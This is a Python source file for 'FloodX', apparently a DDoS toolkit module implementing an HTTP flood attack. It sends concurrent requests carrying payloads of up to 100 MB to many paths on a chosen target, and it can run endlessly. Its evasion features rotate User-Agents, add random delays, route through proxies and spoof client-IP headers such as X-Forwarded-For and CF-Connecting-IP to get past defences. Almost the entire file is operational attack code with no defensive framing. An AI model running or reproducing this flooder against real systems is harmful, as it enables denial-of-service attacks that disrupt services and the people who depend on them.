"""
FloodX: HTTP Flood Attack Implementation
Advanced HTTP flooding with evasion techniques and proxy support.
"""

import asyncio
import aiohttp
import random
import time
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin

from common.logger import logger, stats_logger
from config import USER_AGENTS, COMMON_HEADERS


class HttpFlooder:
    """Advanced HTTP flood attack with multiple evasion techniques."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config['port']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.session = None
        self.request_count = 0
        self.error_count = 0
        
        # Build target URL
        protocol = 'https' if self.port == 443 else 'http'
        self.base_url = f"{protocol}://{self.target}:{self.port}"
        
        # HTTP paths to target
        self.target_paths = [
            '/', '/index.html', '/home', '/api', '/search',
            '/login', '/admin', '/dashboard', '/profile',
            '/api/v1/data', '/api/v2/users', '/wp-admin',
            '/uploads', '/download', '/assets', '/static',
            '/api/search', '/api/users', '/api/products',
            '/forum', '/blog', '/news', '/contact'
        ]
        
        # HTTP methods to use
        self.methods = ['GET', 'POST', 'PUT', 'HEAD', 'OPTIONS']
        
        # Advanced evasion settings
        self.evasion_enabled = config.get('advanced', False)
        self.use_proxies = 'proxy_manager' in config
        
        # MASSIVE PAYLOAD GENERATION for high data transmission
        self.generate_massive_payloads()

        # MASSIVE PAYLOAD GENERATION for high data transmission
        self.generate_massive_payloads()

    def generate_massive_payloads(self):
        """Generate massive payloads for high data transmission (100GB+ potential)."""
        logger.info("💾 Generating massive HTTP payloads for maximum data transmission...")
        
        # Generate different payload sizes (MB range per request)
        self.payload_sizes = [
            1024 * 1024,      # 1 MB
            5 * 1024 * 1024,  # 5 MB  
            10 * 1024 * 1024, # 10 MB
            50 * 1024 * 1024, # 50 MB
            100 * 1024 * 1024 # 100 MB
        ]
        
        # Base patterns for payload generation
        self.payload_patterns = [
            'A' * 1024,  # Simple pattern
            ''.join([chr(i % 256) for i in range(1024)]),  # Binary-like pattern
            'POST_DATA=' + 'X' * 1000,  # Form data pattern
            'FILE_UPLOAD=' + 'B' * 2000,  # File upload simulation
            'JSON_PAYLOAD=' + '{"data":"' + 'C' * 1000 + '"}',  # JSON pattern
        ]
        
        # Pre-generate some large payloads to avoid runtime generation overhead
        self.cached_payloads = {}
        for size in [1024*100, 1024*500, 1024*1024]:  # 100KB, 500KB, 1MB
            pattern = random.choice(self.payload_patterns)
            multiplier = size // len(pattern) + 1
            self.cached_payloads[size] = (pattern * multiplier)[:size]
        
        logger.info(f"📦 Generated {len(self.cached_payloads)} massive payload templates")
        logger.info(f"🎯 Maximum payload size: {max(self.payload_sizes) // (1024*1024)} MB per request")
    
    def get_massive_payload(self) -> bytes:
        """Get a massive payload for maximum data transmission."""
        # Choose random payload size (favoring larger sizes for max data)
        size = random.choices(
            self.payload_sizes,
            weights=[10, 20, 30, 25, 15],  # Favor larger payloads
            k=1
        )[0]
        
        # Use cached payload if available, otherwise generate
        if size in self.cached_payloads:
            payload = self.cached_payloads[size]
        else:
            pattern = random.choice(self.payload_patterns)
            multiplier = size // len(pattern) + 1
            payload = (pattern * multiplier)[:size]
        
        return payload.encode('utf-8', errors='ignore')

    async def run(self):
        """Execute the HTTP flood attack."""
        logger.info(f"🌐 Starting HTTP flood: {self.concurrency} concurrent requests for {self.duration}s")
        
        # Configure HTTP session
        timeout = aiohttp.ClientTimeout(total=10, connect=3)
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ttl_dns_cache=300,
            use_dns_cache=True,
            enable_cleanup_closed=True
        )
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=self._get_base_headers()
        )
        
        try:
            self.running = True
            start_time = time.time()
            
            # Create semaphore to limit concurrency
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch attack tasks
            tasks = []
            
            # Run for specified duration or endless if duration is 0
            if self.duration > 0:
                # Duration-based mode
                while self.running and (time.time() - start_time) < self.duration:
                    if len(tasks) < self.concurrency:
                        task = asyncio.create_task(self._attack_worker(semaphore))
                        tasks.append(task)
                    
                    # Clean up completed tasks
                    tasks = [t for t in tasks if not t.done()]
                    
                    await asyncio.sleep(0.01)  # Small delay to prevent overwhelming
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    # Launch initial workers
                    for _ in range(self.concurrency):
                        task = asyncio.create_task(self._attack_worker(semaphore))
                        tasks.append(task)
                    
                    while self.running:
                        # Continuous operation with worker restart cycle
                        await asyncio.sleep(60)  # Check every minute
                        
                        # Clean up completed tasks and restart if needed
                        active_tasks = [t for t in tasks if not t.done()]
                        
                        if len(active_tasks) < self.concurrency * 0.5:
                            logger.info("🔄 Restarting HTTP workers for continuous operation...")
                            
                            # Cancel remaining tasks
                            for task in active_tasks:
                                task.cancel()
                            
                            # Restart workers
                            tasks = []
                            for _ in range(self.concurrency):
                                task = asyncio.create_task(self._attack_worker(semaphore))
                                tasks.append(task)
                        else:
                            tasks = active_tasks
                            
                except KeyboardInterrupt:
                    logger.info("🛑 Endless HTTP flood stopped by user")
                    self.running = False
            
            # Wait for remaining tasks
            if tasks:
                await asyncio.wait(tasks, timeout=5.0)
            
        except Exception as e:
            logger.error(f"❌ HTTP flood failed: {e}")
        finally:
            self.running = False
            if self.session:
                await self.session.close()
            
            logger.info(f"✅ HTTP flood completed: {self.request_count} requests, {self.error_count} errors")

    async def _attack_worker(self, semaphore: asyncio.Semaphore):
        """Individual HTTP attack worker."""
        async with semaphore:
            while self.running:
                try:
                    await self._send_request()
                    self.request_count += 1
                    
                    # Update stats periodically
                    if self.request_count % 100 == 0:
                        stats_logger.update_stats(
                            packets_sent=self.request_count,
                            errors=self.error_count
                        )
                    
                    # Evasion: Random delays
                    if self.evasion_enabled:
                        await asyncio.sleep(random.uniform(0.01, 0.1))
                    
                except Exception as e:
                    self.error_count += 1
                    logger.debug(f"HTTP request error: {e}")

    async def _send_request(self):
        """Send a single HTTP request with massive payloads for maximum data transmission."""
        # Select random target path and method
        path = random.choice(self.target_paths)
        method = random.choice(self.methods)
        url = urljoin(self.base_url, path)
        
        # Build headers with evasion
        headers = self._get_request_headers()
        
        # Generate MASSIVE payload for all request types
        massive_payload = self.get_massive_payload()
        
        # Build payload for POST/PUT requests with massive data
        data = None
        if method in ['POST', 'PUT']:
            # Use massive payload for POST/PUT
            data = massive_payload
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Content-Length'] = str(len(massive_payload))
        elif method == 'GET':
            # Even for GET, add massive query parameters
            massive_query = massive_payload[:4096].decode('utf-8', errors='ignore')  # Limit to 4KB for URL
            params = {'data': massive_query, 'payload': massive_query[:1000]}
        
        # Add custom headers with large values for extra data transmission
        headers['X-Custom-Data'] = 'A' * 1024  # 1KB header
        headers['X-Large-Header'] = 'B' * 2048  # 2KB header
        headers['X-Payload-Info'] = f"size={len(massive_payload)}"
        
        # Send the request with massive payload
        try:
            async with self.session.request(
                method=method,
                url=url,
                headers=headers,
                data=data if method in ['POST', 'PUT'] else None,
                params=params if method == 'GET' else None,
                allow_redirects=False
            ) as response:
                # Read response to ensure connection completion
                await response.read(1024)
                
                # Update stats with massive data transmission
                payload_size = len(massive_payload) if massive_payload else 0
                header_size = sum(len(k) + len(v) for k, v in headers.items())
                total_bytes = payload_size + header_size
                
                stats_logger.increment_packets(1, total_bytes)
                self.request_count += 1
                
        except Exception as e:
            self.error_count += 1
            stats_logger.increment_errors(1)
            logger.debug(f"HTTP massive request error: {e}")

    def _get_base_headers(self) -> Dict[str, str]:
        """Get base HTTP headers."""
        headers = COMMON_HEADERS.copy()
        headers['User-Agent'] = random.choice(USER_AGENTS)
        return headers

    def _get_request_headers(self) -> Dict[str, str]:
        """Generate headers for individual requests with evasion."""
        headers = {}
        
        if self.evasion_enabled:
            # Rotate User-Agent
            headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # Add random headers
            optional_headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': self._generate_fake_ip(),
                'X-Real-IP': self._generate_fake_ip(),
                'X-Originating-IP': self._generate_fake_ip(),
                'CF-Connecting-IP': self._generate_fake_ip(),
                'Client-IP': self._generate_fake_ip(),
                'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
                'Pragma': 'no-cache',
                'DNT': '1',
                'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
                'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
                'Sec-Fetch-User': '?1'
            }
            
            # Add random subset of optional headers
            for header, value in random.sample(list(optional_headers.items()), k=random.randint(2, 5)):
                headers[header] = value
        
        return headers

    def _generate_payload(self) -> str:
        """Generate random payload for POST/PUT requests."""
        if self.evasion_enabled:
            # Generate random form data or JSON
            if random.choice([True, False]):
                # Form data
                fields = ['username', 'password', 'email', 'search', 'query', 'data']
                data = {}
                for _ in range(random.randint(1, 4)):
                    field = random.choice(fields)
                    data[field] = self._generate_random_string(random.randint(5, 20))
                
                return '&'.join([f"{k}={v}" for k, v in data.items()])
            else:
                # JSON data
                import json
                data = {
                    'action': random.choice(['search', 'login', 'submit', 'update']),
                    'data': self._generate_random_string(random.randint(10, 50)),
                    'timestamp': int(time.time())
                }
                return json.dumps(data)
        
        return "data=" + self._generate_random_string(100)

    def _generate_query_params(self) -> Dict[str, str]:
        """Generate random query parameters."""
        params = {}
        param_names = ['q', 'search', 'id', 'page', 'limit', 'offset', 'sort', 'filter']
        
        for _ in range(random.randint(1, 3)):
            name = random.choice(param_names)
            value = self._generate_random_string(random.randint(3, 15))
            params[name] = value
        
        return params

    def _generate_fake_ip(self) -> str:
        """Generate a fake IP address for headers."""
        return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def _generate_random_string(self, length: int) -> str:
        """Generate random string for payloads."""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(length))

    async def stop(self):
        """Stop the HTTP flood attack."""
        logger.info("🛑 Stopping HTTP flood attack...")
        self.running = False
        if self.session:
            await self.session.close()
